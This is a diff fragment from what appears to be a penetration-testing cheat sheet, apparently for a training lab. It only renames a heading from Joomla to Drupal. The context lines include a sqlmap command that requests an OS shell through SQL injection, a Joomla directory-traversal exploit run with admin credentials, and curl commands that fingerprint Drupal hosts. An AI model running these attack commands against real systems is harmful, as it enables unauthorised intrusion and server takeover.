@@ -1971,7 +1971,7 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 	--> python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
 ```
-### Joomla
+### Drupal
 ```
 - curl -s http://drupal.inlanefreight.local | grep Drupal
 - curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
